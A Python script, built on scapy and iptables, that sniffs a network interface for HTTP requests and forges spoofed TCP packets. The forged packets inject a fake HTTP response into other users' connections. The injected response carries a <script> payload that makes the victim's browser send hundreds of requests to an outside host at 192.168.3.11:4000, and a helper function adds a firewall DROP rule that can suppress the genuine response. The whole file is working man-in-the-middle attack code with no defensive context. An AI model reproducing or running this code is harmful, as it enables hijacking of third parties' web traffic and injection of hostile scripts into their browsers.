import iptc
from scapy.all import *
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from datetime import datetime

ack = 0
last_seq = 0


def sniff_packets():
    print("sniff start")
    while True:
        dump = sniff(iface='eth0', timeout=2)
        for j in range(0, len(dump)-1):
            if dump[j].haslayer(HTTPRequest) and dump[j + 1].haslayer(TCP) and dump[j][TCP].ack == dump[j + 1][TCP].seq:
                packet_send(dump[j + 1])


def packet_send(pack):
    now = datetime.now()
    payload = "<script>for (let i = 1; i < 350; ++i){const n = new Image();n.src = " \
              "\"http://192.168.3.11:4000/image?id=\" + i.toString();}</script> "
    RESP = "HTTP/1.1 200 OK\r\n"
    RESP += "Server: nginx\r\n"
    RESP += "Date: Sat, {d} Jun 2022 {h}:{m}:{s} GMT\r\n".format(d=now.today(), h=now.hour, m=now.minute, s=now.second)
    RESP += "Content_Type: text/html; charset=UTF-8\r\n"
    RESP += "Connection: close\r\n"
    RESP += "Vary: Accept-Encoding\r\n"
    RESP += "X-Frame-Options: DENY\r\n"
    RESP += "X-Content-Type-Options: nosniff\r\n"
    RESP += "Content-Security-Policy: frame-src 'self';\r\n"
    RESP += "X-UA-Compatible: IE=edge\r\n"
    RESP += "Content-Length: {l}\r\n".format(l=len(payload))
    RESP += "\r\n"
    RESP += payload
    fake_packet = Ether(src=pack[Ether].src, dst=pack[Ether].dst) / \
                  IP(src=pack[IP].src, dst=pack[IP].dst, id=pack[IP].id + 1, flags=2) / \
                  TCP(sport=pack[TCP].sport, dport=pack[TCP].dport, seq=pack[TCP].seq, window=pack[TCP].window,
                      ack=pack[TCP].ack, flags=0x018, options=pack[TCP].options) / \
                  payload

    sendp(fake_packet)
    print("ACK: ", pack[IP].id)
    sys.exit()


def block_rule():
    rule = iptc.Rule()
    target = iptc.Target(rule, "DROP")
    rule.target = target
    chain = iptc.Chain(iptc.Table(iptc.Table.FILTER), "FORWARD")
    chain.insert_rule(rule)


def main():
    sniff_packets()


if __name__ == "__main__":
    main()
